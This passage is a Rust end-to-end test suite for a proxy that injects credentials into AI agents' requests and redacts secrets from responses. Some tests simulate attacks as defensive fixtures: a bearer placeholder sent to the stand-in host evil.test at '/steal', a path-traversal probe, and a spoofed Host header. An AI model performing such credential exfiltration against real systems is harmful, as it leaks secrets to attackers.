//! End-to-end tests: a real proxy listener, fake upstreams in process, a proxy-aware client.
#![allow(
    clippy::pedantic,
    clippy::type_complexity,
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::panic,
    missing_docs,
    unreachable_pub
)]

mod common;

use std::io::Write as _;
use std::sync::Arc;

use bytes::Bytes;
use common::*;
use http::{Response, StatusCode, Version};
use scrim_toolproxy::*;

const HOSTS: &[&str] = &["api.acme.test", "evil.test", "git.acme.test"];

struct World {
    proxy: Proxy,
    up: Upstream,
    client: Client,
}

fn config(port: u16) -> String {
    format!(
        r"
credentials:
  - name: acme
    reference: env://ACME
    placeholders: [SCRIM_ACME_KEY]
    binding: {{ hosts: ['api.acme.test:{port}'] }}
    inject: [header, cookie, query, path, body]
  - name: header-only
    reference: env://HEADER_ONLY
    placeholders: [SCRIM_HEADER_ONLY]
    binding: {{ hosts: ['api.acme.test:{port}'] }}
  - name: weird
    reference: env://WEIRD
    placeholders: [SCRIM_WEIRD]
    binding: {{ hosts: ['api.acme.test:{port}'] }}
    inject: [anywhere]
  - name: limited
    reference: env://LIMITED
    placeholders: [SCRIM_LIMITED]
    binding: {{ hosts: ['api.acme.test:{port}'], methods: [GET], paths: ['/v1/*'] }}
  - name: nowhere
    reference: env://NOWHERE
    placeholders: [SCRIM_NOWHERE]
capture:
  - name: new-token
    hosts: ['api.acme.test:{port}']
    methods: [POST]
    path: /v1/tokens
    field: /token
    store: bao://kv/agents/acme-new#token
  - name: header-token
    hosts: ['api.acme.test:{port}']
    path: /v1/header-token
    header: x-new-token
    store: bao://kv/agents/acme-hdr#token
"
    )
}

fn values() -> Vec<(&'static str, &'static str)> {
    vec![
        ("env://ACME", ACME_VALUE),
        ("env://HEADER_ONLY", "header-only-value-0a1b2c3d"),
        ("env://WEIRD", WEIRD_VALUE),
        ("env://LIMITED", "limited-value-9e8d7c6b"),
        ("env://NOWHERE", "nowhere-value-5a4b3c2d"),
    ]
}

async fn world_with(handler: Handler, opts: ProxyOptions) -> World {
    let ca = UpstreamCa::new();
    let up = tls_upstream(&ca, HOSTS, handler).await;
    let mut opts = opts;
    opts.roots.push(ca.der());
    for h in HOSTS {
        opts.hosts.push(((*h).to_owned(), up.addr));
    }
    let proxy = start_proxy(opts).await;
    proxy
        .proxy
        .apply(snapshot(&config(up.port()), &values()))
        .unwrap();
    let client = Client::new(&proxy);
    World { proxy, up, client }
}

async fn world(handler: Handler) -> World {
    world_with(handler, ProxyOptions::default()).await
}

impl World {
    fn port(&self) -> u16 {
        self.up.port()
    }
    async fn get(&self, host: &str, path: &str, headers: &[(&str, &str)]) -> Got {
        let mut b = req("GET", host, self.port(), path);
        for (k, v) in headers {
            b = b.header(*k, *v);
        }
        self.client
            .send(host, self.port(), b.body(body(Bytes::new())).unwrap())
            .await
            .unwrap()
    }
    fn texts(&self, got: &Got) -> Vec<String> {
        let mut t = audit_texts(&self.proxy);
        t.push(got.text());
        t.push(format!("{:?}", got.headers));
        t
    }
}

#[tokio::test]
async fn injects_into_header_toward_bound_host_and_echo_shows_placeholder() {
    let w = world(echo_handler()).await;
    let got = w
        .get(
            "api.acme.test",
            "/v1/me",
            &[("authorization", "Bearer SCRIM_ACME_KEY")],
        )
        .await;
    assert_eq!(got.status, StatusCode::OK, "{}", got.text());
    let seen = w.up.seen();
    assert_eq!(seen.len(), 1);
    assert_eq!(
        seen[0].headers["authorization"],
        format!("Bearer {ACME_VALUE}").as_str()
    );
    // The echo goes back through redaction and shows the placeholder the agent sent.
    assert_eq!(
        got.json()["headers"]["authorization"],
        "Bearer SCRIM_ACME_KEY"
    );
    assert_no_values(&w.texts(&got));
    let events = w.proxy.audit.events();
    assert!(events.iter().any(|e| matches!(e, AuditEvent::CredentialInjected { credentials, .. } if credentials == &["acme"])));
    assert!(
        events
            .iter()
            .any(|e| matches!(e, AuditEvent::ResponseRedacted { .. }))
    );
}

#[tokio::test]
async fn generated_and_reference_placeholders_are_injected() {
    let w = world(echo_handler()).await;
    let got = w
        .get("api.acme.test", "/", &[("x-api-key", GENERATED_ACME)])
        .await;
    assert_eq!(got.status, StatusCode::OK);
    assert_eq!(w.up.seen()[0].headers["x-api-key"], ACME_VALUE);
    assert_eq!(got.json()["headers"]["x-api-key"], GENERATED_ACME);
    let got = w
        .get(
            "api.acme.test",
            "/",
            &[("x-api-key", "{{scrim:env://ACME}}")],
        )
        .await;
    assert_eq!(got.status, StatusCode::OK);
    assert_eq!(w.up.seen()[1].headers["x-api-key"], ACME_VALUE);
}

#[tokio::test]
async fn placeholder_toward_unbound_host_is_refused_and_audited() {
    let w = world(echo_handler()).await;
    let got = w
        .get(
            "evil.test",
            "/steal",
            &[("authorization", "Bearer SCRIM_ACME_KEY")],
        )
        .await;
    assert_eq!(got.status, StatusCode::FORBIDDEN);
    assert_eq!(got.error_code().as_deref(), Some("unbound_destination"));
    assert!(w.up.seen().is_empty(), "nothing may reach the upstream");
    let events = w.proxy.audit.events();
    assert!(events.iter().any(|e| matches!(e,
        AuditEvent::RequestRefused { code: ErrorCode::UnboundDestination, credentials, destination, .. }
            if credentials == &["acme"] && destination.contains("evil.test"))));
    assert_no_values(&w.texts(&got));
}

#[tokio::test]
async fn credential_without_binding_is_never_injected() {
    let w = world(echo_handler()).await;
    let got = w
        .get(
            "api.acme.test",
            "/",
            &[("authorization", "Bearer SCRIM_NOWHERE")],
        )
        .await;
    assert_eq!(got.error_code().as_deref(), Some("unbound_credential"));
    assert!(w.up.seen().is_empty());
    assert!(w.proxy.audit.events().iter().any(|e| matches!(e,
        AuditEvent::RequestRefused { code: ErrorCode::UnboundCredential, credentials, .. } if credentials == &["nowhere"])));
}

#[tokio::test]
async fn method_and_path_bindings_are_enforced() {
    let w = world(echo_handler()).await;
    let ok = w
        .get(
            "api.acme.test",
            "/v1/items",
            &[("authorization", "SCRIM_LIMITED")],
        )
        .await;
    assert_eq!(ok.status, StatusCode::OK);
    let bad_path = w
        .get(
            "api.acme.test",
            "/admin",
            &[("authorization", "SCRIM_LIMITED")],
        )
        .await;
    assert_eq!(
        bad_path.error_code().as_deref(),
        Some("unbound_destination")
    );
    let dots = w
        .get(
            "api.acme.test",
            "/v1/../admin",
            &[("authorization", "SCRIM_LIMITED")],
        )
        .await;
    assert_eq!(dots.error_code().as_deref(), Some("unbound_destination"));
    let r = req("POST", "api.acme.test", w.port(), "/v1/items")
        .header("authorization", "SCRIM_LIMITED");
    let bad_method = w
        .client
        .send("api.acme.test", w.port(), r.body(body("{}")).unwrap())
        .await
        .unwrap();
    assert_eq!(
        bad_method.error_code().as_deref(),
        Some("unbound_destination")
    );
    assert_eq!(w.up.seen().len(), 1);
}

#[tokio::test]
async fn placeholder_in_undeclared_location_is_refused() {
    let w = world(echo_handler()).await;
    let r = req("POST", "api.acme.test", w.port(), "/")
        .header("content-type", "application/json")
        .body(body(r#"{"key":"SCRIM_HEADER_ONLY"}"#))
        .unwrap();
    let got = w.client.send("api.acme.test", w.port(), r).await.unwrap();
    assert_eq!(got.error_code().as_deref(), Some("undeclared_location"));
    assert!(w.up.seen().is_empty());
    let q = w.get("api.acme.test", "/?k=SCRIM_HEADER_ONLY", &[]).await;
    assert_eq!(q.error_code().as_deref(), Some("undeclared_location"));
}

#[tokio::test]
async fn substitutes_in_url_cookie_basic_auth_and_bodies() {
    let w = world(echo_handler()).await;
    let got = w
        .get(
            "api.acme.test",
            "/v1/SCRIM_WEIRD/x?key=SCRIM_WEIRD&other=1",
            &[("cookie", "session=SCRIM_ACME_KEY; theme=dark")],
        )
        .await;
    assert_eq!(got.status, StatusCode::OK, "{}", got.text());
    let s = &w.up.seen()[0];
    let encoded = "we%22ird%26va%3Dlue%2B%2Fx";
    assert_eq!(s.uri, format!("/v1/{encoded}/x?key={encoded}&other=1"));
    assert_eq!(
        s.headers["cookie"],
        format!("session={ACME_VALUE}; theme=dark").as_str()
    );

    // Basic credentials, as git and curl -u send them.
    use base64::Engine as _;
    let basic = base64::engine::general_purpose::STANDARD.encode("x-access-token:SCRIM_ACME_KEY");
    let got = w
        .get(
            "api.acme.test",
            "/",
            &[("authorization", &format!("Basic {basic}"))],
        )
        .await;
    assert_eq!(got.status, StatusCode::OK);
    let sent = w.up.seen()[1].headers["authorization"]
        .to_str()
        .unwrap()
        .to_owned();
    let decoded = base64::engine::general_purpose::STANDARD
        .decode(sent.strip_prefix("Basic ").unwrap())
        .unwrap();
    assert_eq!(decoded, format!("x-access-token:{ACME_VALUE}").as_bytes());

    // JSON with a value that needs escaping, and the \u-escaped generated placeholder.
    let json = format!(
        r#"{{"a":"SCRIM_WEIRD","b":"{}"}}"#,
        serde_json::to_string(GENERATED_ACME)
            .unwrap()
            .trim_matches('"')
    );
    let escaped = json.replace('⟦', "\\u27e6").replace('⟧', "\\u27e7");
    let r = req("POST", "api.acme.test", w.port(), "/")
        .header("content-type", "application/json")
        .body(body(escaped))
        .unwrap();
    let got = w.client.send("api.acme.test", w.port(), r).await.unwrap();
    assert_eq!(got.status, StatusCode::OK, "{}", got.text());
    let v: serde_json::Value = serde_json::from_slice(&w.up.seen()[2].body).unwrap();
    assert_eq!(v["a"], WEIRD_VALUE);
    assert_eq!(v["b"], ACME_VALUE);
    assert_eq!(
        w.up.seen()[2].headers["content-length"],
        w.up.seen()[2].body.len().to_string().as_str()
    );

    // Form body.
    let r = req("POST", "api.acme.test", w.port(), "/")
        .header("content-type", "application/x-www-form-urlencoded")
        .body(body("token=SCRIM_WEIRD&x=1"))
        .unwrap();
    w.client.send("api.acme.test", w.port(), r).await.unwrap();
    assert_eq!(w.up.seen()[3].body, format!("token={encoded}&x=1"));

    // Multipart with a JSON part and a plain part.
    let mp = "--BOUND\r\nContent-Disposition: form-data; name=\"meta\"\r\nContent-Type: application/json\r\n\r\n{\"k\":\"SCRIM_WEIRD\"}\r\n--BOUND\r\nContent-Disposition: form-data; name=\"raw\"\r\n\r\nSCRIM_WEIRD\r\n--BOUND--\r\n";
    let r = req("POST", "api.acme.test", w.port(), "/")
        .header("content-type", "multipart/form-data; boundary=BOUND")
        .body(body(mp))
        .unwrap();
    let got = w.client.send("api.acme.test", w.port(), r).await.unwrap();
    assert_eq!(got.status, StatusCode::OK, "{}", got.text());
    let sent = String::from_utf8(w.up.seen()[4].body.to_vec()).unwrap();
    assert!(sent.contains(r#"{"k":"we\"ird&va=lue+/x"}"#), "{sent}");
    assert!(
        sent.contains(&format!("\r\n\r\n{WEIRD_VALUE}\r\n--BOUND--")),
        "{sent}"
    );
    assert_no_values(&w.texts(&got));
}

fn gzip(data: &[u8]) -> Vec<u8> {
    let mut e = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
    e.write_all(data).unwrap();
    e.finish().unwrap()
}

fn gunzip(data: &[u8]) -> Vec<u8> {
    use std::io::Read as _;
    let mut out = Vec::new();
    flate2::read::GzDecoder::new(data)
        .read_to_end(&mut out)
        .unwrap();
    out
}

#[tokio::test]
async fn gzip_json_body_is_rewritten_with_length_and_digest() {
    let w = world(echo_handler()).await;
    let raw = br#"{"api_key":"SCRIM_ACME_KEY"}"#;
    let gz = gzip(raw);
    use base64::Engine as _;
    use sha2::Digest as _;
    let digest = base64::engine::general_purpose::STANDARD.encode(sha2::Sha256::digest(&gz));
    let r = req("PUT", "api.acme.test", w.port(), "/doc")
        .header("content-type", "application/json")
        .header("content-encoding", "gzip")
        .header("content-digest", format!("sha-256=:{digest}:"))
        .body(body(gz))
        .unwrap();
    let got = w.client.send("api.acme.test", w.port(), r).await.unwrap();
    assert_eq!(got.status, StatusCode::OK, "{}", got.text());
    let s = &w.up.seen()[0];
    let plain = gunzip(&s.body);
    let v: serde_json::Value = serde_json::from_slice(&plain).unwrap();
    assert_eq!(v["api_key"], ACME_VALUE);
    assert_eq!(
        s.headers["content-length"],
        s.body.len().to_string().as_str()
    );
    let expect = base64::engine::general_purpose::STANDARD.encode(sha2::Sha256::digest(&s.body));
    assert_eq!(
        s.headers["content-digest"],
        format!("sha-256=:{expect}:").as_str()
    );
}

#[tokio::test]
async fn every_supported_coding_round_trips() {
    let w = world(echo_handler()).await;
    let raw = b"key=SCRIM_ACME_KEY";
    let cases: Vec<(&str, Vec<u8>)> = vec![
        ("deflate", {
            let mut e = flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::default());
            e.write_all(raw).unwrap();
            e.finish().unwrap()
        }),
        ("br", {
            let mut out = Vec::new();
            {
                let mut e = brotli::CompressorWriter::new(&mut out, 4096, 5, 22);
                e.write_all(raw).unwrap();
            }
            out
        }),
        ("zstd", zstd::encode_all(&raw[..], 3).unwrap()),
    ];
    for (i, (coding, data)) in cases.into_iter().enumerate() {
        let r = req("POST", "api.acme.test", w.port(), "/")
            .header("content-encoding", coding)
            .body(body(data))
            .unwrap();
        let got = w.client.send("api.acme.test", w.port(), r).await.unwrap();
        assert_eq!(got.status, StatusCode::OK, "{coding}: {}", got.text());
        let sent = &w.up.seen()[i].body;
        let plain = match coding {
            "deflate" => {
                use std::io::Read as _;
                let mut o = Vec::new();
                flate2::read::ZlibDecoder::new(&sent[..])
                    .read_to_end(&mut o)
                    .unwrap();
                o
            }
            "br" => {
                use std::io::Read as _;
                let mut o = Vec::new();
                brotli::Decompressor::new(&sent[..], 4096)
                    .read_to_end(&mut o)
                    .unwrap();
                o
            }
            _ => zstd::decode_all(&sent[..]).unwrap(),
        };
        assert_eq!(plain, format!("key={ACME_VALUE}").as_bytes(), "{coding}");
    }
}

#[tokio::test]
async fn unsupported_request_coding_is_refused_naming_it() {
    let w = world(echo_handler()).await;
    let r = req("POST", "api.acme.test", w.port(), "/")
        .header("content-encoding", "compress")
        .body(body("opaque"))
        .unwrap();
    let got = w.client.send("api.acme.test", w.port(), r).await.unwrap();
    assert_eq!(got.status, StatusCode::UNSUPPORTED_MEDIA_TYPE);
    assert_eq!(got.error_code().as_deref(), Some("unsupported_encoding"));
    assert!(got.text().contains("compress"));
    assert!(w.up.seen().is_empty());
}

#[tokio::test]
async fn chunked_request_body_is_rewritten() {
    let w = world(echo_handler()).await;
    let chunks = vec![
        Ok::<_, std::convert::Infallible>(hyper::body::Frame::data(Bytes::from(
            "{\"k\":\"SCRIM_AC",
        ))),
        Ok(hyper::body::Frame::data(Bytes::from("ME_KEY\"}"))),
    ];
    let stream = http_body_util::StreamBody::new(futures_util::stream::iter(chunks));
    let r = req("POST", "api.acme.test", w.port(), "/")
        .header("content-type", "application/json")
        .body(stream)
        .unwrap();
    let got = w.client.send("api.acme.test", w.port(), r).await.unwrap();
    assert_eq!(got.status, StatusCode::OK);
    let s = &w.up.seen()[0];
    assert_eq!(s.body, format!("{{\"k\":\"{ACME_VALUE}\"}}"));
    assert!(s.headers.get("transfer-encoding").is_none());
}

#[tokio::test]
async fn http2_client_and_upstream() {
    let mut w = world(echo_handler()).await;
    w.client.h2 = true;
    let r = req_h2("POST", "api.acme.test", w.port(), "/h2")
        .header("authorization", "Bearer SCRIM_ACME_KEY")
        .header("content-encoding", "gzip")
        .body(body(gzip(b"v=SCRIM_ACME_KEY")))
        .unwrap();
    let got = w.client.send("api.acme.test", w.port(), r).await.unwrap();
    assert_eq!(got.status, StatusCode::OK, "{}", got.text());
    assert_eq!(got.version, Version::HTTP_2);
    let s = &w.up.seen()[0];
    assert_eq!(s.version, Version::HTTP_2);
    assert_eq!(
        s.headers["authorization"],
        format!("Bearer {ACME_VALUE}").as_str()
    );
    assert_eq!(gunzip(&s.body), format!("v={ACME_VALUE}").as_bytes());
    assert_eq!(
        got.json()["headers"]["authorization"],
        "Bearer SCRIM_ACME_KEY"
    );
}

#[tokio::test]
async fn misdirected_host_header_is_refused() {
    let w = world(echo_handler()).await;
    let r = req("GET", "api.acme.test", w.port(), "/")
        .header("host", "evil.test")
        .header("authorization", "SCRIM_ACME_KEY");
    let r = r.body(body(Bytes::new())).unwrap();
    let mut r = r;
    r.headers_mut().insert("host", "evil.test".parse().unwrap());
    let got = w.client.send("api.acme.test", w.port(), r).await.unwrap();
    assert_eq!(got.error_code().as_deref(), Some("misdirected_request"));
    assert!(w.up.seen().is_empty());
}

#[tokio::test]
async fn signed_request_is_refused_when_it_would_change() {
    let w = world(echo_handler()).await;
    let got = w
        .get(
            "api.acme.test",
            "/",
            &[
                (
                    "authorization",
                    "AWS4-HMAC-SHA256 Credential=x/y, Signature=abc",
                ),
                ("x-api-key", "SCRIM_ACME_KEY"),
            ],
        )
        .await;
    assert_eq!(got.error_code().as_deref(), Some("resigning_unsupported"));
    assert!(got.text().contains("SigV4"));
    assert!(w.up.seen().is_empty());
}

#[tokio::test]
async fn upgrades_are_refused() {
    let w = world(echo_handler()).await;
    let got = w
        .get(
            "api.acme.test",
            "/ws",
            &[("connection", "upgrade"), ("upgrade", "websocket")],
        )
        .await;
    assert_eq!(got.error_code().as_deref(), Some("upgrade_unsupported"));
}

#[tokio::test]
async fn requests_without_placeholders_pass_untouched() {
    let w = world(echo_handler()).await;
    let r = req("POST", "evil.test", w.port(), "/x")
        .header("content-encoding", "gzip")
        .body(body(gzip(b"plain")))
        .unwrap();
    let got = w.client.send("evil.test", w.port(), r).await.unwrap();
    assert_eq!(got.status, StatusCode::OK);
    assert_eq!(gunzip(&w.up.seen()[0].body), b"plain");
}

#[tokio::test]
async fn oversized_body_streams_but_a_placeholder_in_it_aborts() {
    let settings = ToolProxySettings {
        max_buffered_body: 1024,
        ..Default::default()
    };
    let w = world_with(
        echo_handler(),
        ProxyOptions {
            settings,
            ..Default::default()
        },
    )
    .await;
    let big = "a".repeat(4000);
    let r = req("POST", "api.acme.test", w.port(), "/big")
        .body(body(big.clone()))
        .unwrap();
    let got = w.client.send("api.acme.test", w.port(), r).await.unwrap();
    assert_eq!(got.status, StatusCode::OK);
    assert_eq!(w.up.seen()[0].body.len(), 4000);

    let with_ph = format!("{big} SCRIM_ACME_KEY");
    let r = req("POST", "api.acme.test", w.port(), "/big")
        .body(body(with_ph))
        .unwrap();
    let res = w.client.send("api.acme.test", w.port(), r).await;
    if let Ok(g) = res {
        assert_eq!(
            g.error_code().as_deref(),
            Some("body_too_large"),
            "{}",
            g.text()
        );
    }
    assert!(w.up.seen().iter().all(
        |s| !String::from_utf8_lossy(&s.body).contains("SCRIM_ACME_KEY")
            && !String::from_utf8_lossy(&s.body).contains(ACME_VALUE)
    ));
}

fn leaking_handler() -> Handler {
    Arc::new(|s: &Seen| {
        let path = s.uri.clone();
        if path.starts_with("/gzip") {
            let b = gzip(format!("{{\"secret\":\"{ACME_VALUE}\"}}").as_bytes());
            Response::builder()
                .header("content-type", "application/json")
                .header("content-encoding", "gzip")
                .header("content-length", b.len())
                .body(ResponseBody::Full(Bytes::from(b)))
                .unwrap()
        } else if path.starts_with("/stream-br") {
            let mut out = Vec::new();
            let mut enc = brotli::CompressorWriter::new(Vec::new(), 4096, 5, 22);
            let mut chunks = Vec::new();
            for part in [
                "data: one ",
                &ACME_VALUE[..10],
                &ACME_VALUE[10..],
                " two\n\n",
            ] {
                enc.write_all(part.as_bytes()).unwrap();
                enc.flush().unwrap();
                chunks.push(Bytes::from(std::mem::take(enc.get_mut())));
            }
            out.extend(enc.into_inner());
            chunks.push(Bytes::from(out));
            Response::builder()
                .header("content-type", "text/event-stream")
                .header("content-encoding", "br")
                .body(ResponseBody::Chunks(chunks))
                .unwrap()
        } else if path.starts_with("/stream") {
            let chunks = vec![
                Bytes::from("data: start "),
                Bytes::from(ACME_VALUE[..7].to_owned()),
                Bytes::from(ACME_VALUE[7..].to_owned()),
                Bytes::from(" end\n\n"),
            ];
            Response::builder()
                .header("content-type", "text/event-stream")
                .body(ResponseBody::Chunks(chunks))
                .unwrap()
        } else if path.starts_with("/compress") {
            Response::builder()
                .header("content-encoding", "compress")
                .body(ResponseBody::Full(Bytes::from("x")))
                .unwrap()
        } else if path.starts_with("/header") {
            Response::builder()
                .header("x-echo", format!("token {ACME_VALUE}"))
                .body(ResponseBody::Full(Bytes::new()))
                .unwrap()
        } else if path.starts_with("/webhook") {
            ok_json(serde_json::json!({"id": 1, "signing_secret": WEIRD_VALUE}))
        } else {
            ok_json(serde_json::json!({"plain": true}))
        }
    })
}

#[tokio::test]
async fn compressed_response_is_redacted() {
    let w = world(leaking_handler()).await;
    let got = w
        .get("api.acme.test", "/gzip", &[("accept-encoding", "gzip")])
        .await;
    assert_eq!(got.status, StatusCode::OK);
    assert_eq!(got.headers["content-encoding"], "gzip");
    assert_eq!(
        got.headers["content-length"],
        got.body.len().to_string().as_str()
    );
    let v: serde_json::Value = serde_json::from_slice(&gunzip(&got.body)).unwrap();
    assert_eq!(v["secret"], GENERATED_ACME);
}

#[tokio::test]
async fn streamed_responses_are_redacted_across_chunks() {
    let w = world(leaking_handler()).await;
    let got = w.get("evil.test", "/stream", &[]).await;
    assert_eq!(got.text(), format!("data: start {GENERATED_ACME} end\n\n"));
    let got = w.get("api.acme.test", "/stream-br", &[]).await;
    let mut plain = Vec::new();
    {
        use std::io::Read as _;
        brotli::Decompressor::new(&got.body[..], 4096)
            .read_to_end(&mut plain)
            .unwrap();
    }
    assert_eq!(
        String::from_utf8(plain).unwrap(),
        format!("data: one {GENERATED_ACME} two\n\n")
    );
    assert!(got.headers.get("content-length").is_none());
}

#[tokio::test]
async fn response_headers_and_created_secrets_are_redacted() {
    let w = world(leaking_handler()).await;
    let got = w.get("api.acme.test", "/header", &[]).await;
    assert_eq!(
        got.headers["x-echo"].as_bytes(),
        format!("token {GENERATED_ACME}").as_bytes()
    );
    let got = w.get("api.acme.test", "/webhook", &[]).await;
    assert_eq!(got.json()["signing_secret"], "SCRIM_WEIRD");
    assert_no_values(&w.texts(&got));
}

#[tokio::test]
async fn unscannable_response_is_withheld() {
    let w = world(leaking_handler()).await;
    let got = w.get("api.acme.test", "/compress", &[]).await;
    assert_eq!(got.status, StatusCode::BAD_GATEWAY);
    assert_eq!(got.error_code().as_deref(), Some("response_withheld"));
    assert!(
        w.proxy
            .audit
            .events()
            .iter()
            .any(|e| matches!(e, AuditEvent::ResponseWithheld { .. }))
    );
}

#[tokio::test]
async fn unchanged_responses_are_byte_identical() {
    let w = world(leaking_handler()).await;
    let got = w.get("api.acme.test", "/plain", &[]).await;
    assert_eq!(got.body, serde_json::json!({"plain": true}).to_string());
}

fn token_handler() -> Handler {
    Arc::new(|s: &Seen| {
        if s.uri.starts_with("/v1/tokens") {
            ok_json(serde_json::json!({"id": "t1", "token": "new-token-1f2e3d4c5b6a"}))
        } else if s.uri.starts_with("/v1/again") {
            ok_json(serde_json::json!({"token": "new-token-1f2e3d4c5b6a"}))
        } else if s.uri.starts_with("/v1/header-token") {
            Response::builder()
                .header("x-new-token", "hdr-token-99aa88bb77")
                .body(ResponseBody::Full(Bytes::new()))
                .unwrap()
        } else {
            ok_json(serde_json::json!({}))
        }
    })
}

#[tokio::test]
async fn capture_rule_stores_token_and_agent_sees_placeholder() {
    let w = world(token_handler()).await;
    let r = req("POST", "api.acme.test", w.port(), "/v1/tokens")
        .body(body("{}"))
        .unwrap();
    let got = w.client.send("api.acme.test", w.port(), r).await.unwrap();
    assert_eq!(got.status, StatusCode::OK);
    assert_eq!(got.json()["token"], "⟦scrim:captured:new-token⟧");
    assert_eq!(got.json()["id"], "t1");
    let stored = w.proxy.capture.stored.lock().unwrap().clone();
    assert_eq!(
        stored,
        vec![(
            "new-token".into(),
            "bao://kv/agents/acme-new#token".into(),
            b"new-token-1f2e3d4c5b6a".to_vec()
        )]
    );
    assert!(
        w.proxy
            .audit
            .events()
            .iter()
            .any(|e| matches!(e, AuditEvent::ValueCaptured { rule, .. } if rule == "new-token"))
    );
    // The same token in a later response is redacted too.
    let again = w.get("api.acme.test", "/v1/again", &[]).await;
    assert_eq!(again.json()["token"], "⟦scrim:captured:new-token⟧");
    // Header capture.
    let hdr = w.get("api.acme.test", "/v1/header-token", &[]).await;
    assert_eq!(hdr.headers["x-new-token"], "⟦scrim:captured:header-token⟧");
    for t in audit_texts(&w.proxy) {
        assert!(
            !t.contains("new-token-1f2e") && !t.contains("hdr-token-99"),
            "{t}"
        );
    }
}

#[tokio::test]
async fn failed_capture_withholds_the_field() {
    let w = world_with(
        token_handler(),
        ProxyOptions {
            capture_fail: true,
            ..Default::default()
        },
    )
    .await;
    let r = req("POST", "api.acme.test", w.port(), "/v1/tokens")
        .body(body("{}"))
        .unwrap();
    let got = w.client.send("api.acme.test", w.port(), r).await.unwrap();
    assert_eq!(got.json()["token"], WITHHELD_MARKER);
    assert!(!got.text().contains("new-token-1f2e"));
    assert!(
        w.proxy
            .audit
            .events()
            .iter()
            .any(|e| matches!(e, AuditEvent::CaptureFailed { .. }))
    );
}

#[tokio::test]
async fn not_ready_before_first_snapshot() {
    let proxy = start_proxy(ProxyOptions::default()).await;
    let client = Client::new(&proxy);
    let err = client
        .send(
            "api.acme.test",
            443,
            req("GET", "api.acme.test", 443, "/")
                .body(body(Bytes::new()))
                .unwrap(),
        )
        .await;
    assert!(
        matches!(err, Err(ClientError::Connect(ref h)) if h.contains("503")),
        "{err:?}"
    );
    let got = client
        .send_plain(
            http::Request::builder()
                .uri("http://api.acme.test/")
                .header("host", "api.acme.test")
                .body(body(Bytes::new()))
                .unwrap(),
        )
        .await;
    assert_eq!(got.error_code().as_deref(), Some("not_ready"));
    assert!(!proxy.proxy.status().ready);
}

#[tokio::test]
async fn plain_http_injection_needs_explicit_opt_in() {
    let up = plain_upstream(echo_handler()).await;
    let proxy = start_proxy(ProxyOptions {
        hosts: vec![
            ("api.acme.test".into(), up.addr),
            ("plain.acme.test".into(), up.addr),
        ],
        ..Default::default()
    })
    .await;
    let yaml = format!(
        r"
credentials:
  - name: tls-only
    reference: env://ACME
    placeholders: [SCRIM_ACME_KEY]
    binding: {{ hosts: ['api.acme.test:{p}'] }}
  - name: plain
    reference: env://WEIRD
    placeholders: [SCRIM_PLAIN]
    binding: {{ hosts: ['plain.acme.test:{p}'], allow_plaintext_http: true }}
",
        p = up.port()
    );
    proxy.proxy.apply(snapshot(&yaml, &values())).unwrap();
    let client = Client::new(&proxy);
    let mk = |host: &str, ph: &str| {
        http::Request::builder()
            .uri(format!("http://{host}:{}/", up.port()))
            .header("host", format!("{host}:{}", up.port()))
            .header("authorization", ph)
            .body(body(Bytes::new()))
            .unwrap()
    };
    let got = client
        .send_plain(mk("api.acme.test", "SCRIM_ACME_KEY"))
        .await;
    assert_eq!(got.error_code().as_deref(), Some("unbound_destination"));
    let got = client
        .send_plain(mk("plain.acme.test", "SCRIM_PLAIN"))
        .await;
    assert_eq!(got.status, StatusCode::OK, "{}", got.text());
    assert_eq!(up.seen()[0].headers["authorization"], WEIRD_VALUE);
}

#[tokio::test]
async fn client_rejecting_the_certificate_fails_closed_and_is_reported() {
    let w = world(echo_handler()).await;
    let other = CertificateAuthority::generate(&CaOptions::default()).unwrap();
    let pinned = Client {
        proxy: w.proxy.addr,
        trust: vec![other.cert_der().clone()],
        h2: false,
        identity: None,
    };
    let r = req("GET", "api.acme.test", w.port(), "/")
        .body(body(Bytes::new()))
        .unwrap();
    let res = pinned.send("api.acme.test", w.port(), r).await;
    assert!(matches!(res, Err(ClientError::Tls(_))), "{res:?}");
    tokio::time::sleep(std::time::Duration::from_millis(100)).await;
    let status = w.proxy.proxy.status();
    assert!(
        status
            .unsupported_destinations
            .contains_key(&format!("api.acme.test:{}", w.port())),
        "{status:?}"
    );
    assert!(w.up.seen().is_empty());
    assert!(
        w.proxy
            .audit
            .events()
            .iter()
            .any(|e| matches!(e, AuditEvent::InterceptionRefused { .. }))
    );
}

#[tokio::test]
async fn ca_rotation_keeps_old_trust_working_during_overlap() {
    let w = world(echo_handler()).await;
    let old_trust = Client::new(&w.proxy);
    let next = CertificateAuthority::generate(&CaOptions::default()).unwrap();
    let new_der = next.cert_der().clone();
    w.proxy
        .proxy
        .ca()
        .rotate(next, std::time::Duration::from_secs(3600))
        .unwrap();
    let new_trust = Client {
        proxy: w.proxy.addr,
        trust: vec![new_der],
        h2: false,
        identity: None,
    };
    let mk = || {
        req("GET", "api.acme.test", w.port(), "/")
            .body(body(Bytes::new()))
            .unwrap()
    };
    assert_eq!(
        old_trust
            .send("api.acme.test", w.port(), mk())
            .await
            .unwrap()
            .status,
        StatusCode::OK
    );
    assert_eq!(
        new_trust
            .send("api.acme.test", w.port(), mk())
            .await
            .unwrap()
            .status,
        StatusCode::OK
    );
    w.proxy.proxy.ca().end_overlap();
    assert!(matches!(
        old_trust.send("api.acme.test", w.port(), mk()).await,
        Err(ClientError::Tls(_))
    ));
    assert_eq!(
        new_trust
            .send("api.acme.test", w.port(), mk())
            .await
            .unwrap()
            .status,
        StatusCode::OK
    );
}

struct FakeLlm;

impl InterceptHandler for FakeLlm {
    fn claims(&self, dest: &Destination) -> bool {
        dest.host == "git.acme.test"
    }
    fn handle(
        &self,
        dest: Destination,
        _req: http::Request<ProxyBody>,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = Response<ProxyBody>> + Send>> {
        Box::pin(async move { Response::new(full(format!("llm engine for {}", dest.host))) })
    }
}

#[tokio::test]
async fn provider_hosts_go_to_the_intercept_handler() {
    let w = world_with(
        echo_handler(),
        ProxyOptions {
            intercept: Some(Arc::new(FakeLlm)),
            ..Default::default()
        },
    )
    .await;
    let got = w.get("git.acme.test", "/v1/messages", &[]).await;
    assert_eq!(got.text(), "llm engine for git.acme.test");
    assert!(w.up.seen().is_empty());
}

#[tokio::test]
async fn snapshot_swap_takes_effect_on_next_request() {
    let w = world(echo_handler()).await;
    let yaml = format!(
        r"
credentials:
  - name: acme
    reference: env://ACME
    placeholders: [SCRIM_ACME_KEY]
    binding: {{ hosts: ['evil.test:{}'] }}
",
        w.port()
    );
    let mut s = snapshot(&yaml, &values());
